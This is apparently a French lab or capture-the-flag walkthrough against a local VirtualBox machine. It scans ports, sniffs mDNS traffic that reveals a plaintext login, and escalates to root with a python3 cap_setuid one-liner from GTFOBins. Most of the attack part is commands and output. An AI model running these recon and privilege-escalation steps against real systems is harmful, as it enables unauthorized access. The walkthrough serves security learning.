# <span style="color: #dddddd;">Bonjour</span>

<span style="color: #dddddd;">👁️</span> **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
 
📄 Rapport --> /home/m0rph3u5/Massap
```

&nbsp;

**🔥 Nmap**

Scan UDP

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo nmap -sU --open 192.168.56.254
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-08 07:43 UTC
Nmap scan report for 192.168.56.254
Host is up (0.00032s latency).

PORT     STATE SERVICE
5353/udp open  zeroconf
MAC Address: 08:00:27:70:1D:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```

&nbsp;

🦈 **SnAff**

Le protocole `zeroconf` est très bavard en général

```
┌─[m0rph3u5@parrot]─[~/Desktop/SnAff]
└──╼ $./SnAff.sh

MP""""""`MM          MMP"""""""MM .8888b .8888b 
M  mmmmm..M          M' .mmmm  MM 88   " 88   " 
M.      `YM 88d888b. M         `M 88aaa  88aaa  
MMMMMMM.  M 88'  `88 M  MMMMM  MM 88     88     
M. .MMM'  M 88    88 M  MMMMM  MM 88     88     
Mb.     .dM dP    dP M  MMMMM  MM dP     dP     
MMMMMMMMMMM          MMMMMMMMMMMM   

by M0rPH3U53
      
🦈 Scan mDNS...100%
 
[+] Services
 
[debian.local]	[192.168.56.254]	[22]	["username=user password=Aroipo902!"]
 
[+] Sauvegardé --> /home/m0rph3u5/Desktop/SnAff/SnAff.txt
```

&nbsp;

**🛰️ fullEx**

Élévation de privilège

```
user@debian:~/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/python3.13 cap_setuid=ep

```

&nbsp;

#️⃣ **GTFobin - python**

**https://gtfobins.org/gtfobins/python/#shell**

```
user@debian:~/fullEx$ python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
# id
uid=0(root) gid=1000(user) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
# bash -i
root@debian:~/fullEx# 
```

&nbsp;
